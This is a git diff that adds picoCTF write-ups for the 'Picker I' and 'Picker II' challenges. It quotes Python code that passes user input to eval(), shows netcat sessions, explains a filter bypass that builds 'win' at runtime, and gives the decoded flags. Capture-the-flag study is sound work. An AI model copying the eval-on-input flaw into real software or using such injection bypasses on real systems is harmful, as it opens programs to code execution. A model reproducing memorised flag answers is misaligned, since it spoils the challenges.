@@ -1139,7 +1139,7 @@ picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_198203f7}
 
 ## Picker I
 
-**win() function:**
+**Relevant functions from the program:**
 
 ```
 def win():
@@ -1152,9 +1152,18 @@ def win():
   for c in flag:
     str_flag += str(hex(ord(c))) + ' '
   print(str_flag)
+
+while(True):
+  try:
+    print('Try entering "getRandomNumber" without the double quotes...')
+    user_input = input('==> ')
+    eval(user_input + '()')
+  except Exception as e:
+    print(e)
+    break
 ```
 
-**command used:**
+**Command used:**
 
 ```
 root@DhruvsPC:~# nc saturn.picoctf.net 53990
@@ -1162,6 +1171,9 @@ Try entering "getRandomNumber" without the double quotes...
 ==> win
 0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d
 ```
+
+Inputting `win` will make the program exexute the `win()` function and thus print the flag.
+
 **Decoding flag from hex:**
 
 ![image](https://github.com/user-attachments/assets/7266edef-6061-4c30-997c-999c3f0c45ec)
@@ -1171,4 +1183,65 @@ Try entering "getRandomNumber" without the double quotes...
 ```
 picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}
 ```
+
+## Picker II
+
+**Relevant functions from the program:**
+
+```
+def win():
+  # This line will not work locally unless you create your own 'flag.txt' in
+  #   the same directory as this script
+  flag = open('flag.txt', 'r').read()
+  #flag = flag[:-1]
+  flag = flag.strip()
+  str_flag = ''
+  for c in flag:
+    str_flag += str(hex(ord(c))) + ' '
+  print(str_flag)
+
+def filter(user_input):
+  if 'win' in user_input:
+    return False
+  return True
+
+while(True):
+  try:
+    user_input = input('==> ')
+    if( filter(user_input) ):
+      eval(user_input + '()')
+    else:
+      print('Illegal input')
+  except Exception as e:
+    print(e)
+    break
+```
+
+**Command used:**
+
+```
+root@DhruvsPC:~# nc saturn.picoctf.net 62292
+==> eval("".join(['w', 'i', 'n']))
+0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x39 0x35 0x64 0x34 0x34 0x35 0x39 0x30 0x7d
+```
+
+Before executing the input, the program checks it using the `filter()` function.
+If the input contains the substring `'win'`, the filter blocks it by returning `False`.
+
+However, the filter only looks for the exact substring `'win'` and doesn't account for how `'win'` might be constructed dynamically during runtime. This opens up a way to bypass the filter.
+
+To exploit this, we avoid directly including `'win'` in the input and instead build it dynamically using Python's string concatenation to combine `'w'`, `'i'`, and `'n'` into `'win'` at runtime.
+
+By inputting `eval("".join(['w', 'i', 'n']))`, we trick the program into constructing `'win'` and executing the `win()` function, which prints the flag.
+
+**Decoding flag from hex:**
+
+![image](https://github.com/user-attachments/assets/ee919933-1a79-47a8-b0b5-036594b57bbd)
+
+**Flag:**
+
+```
+picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
+```
+
 
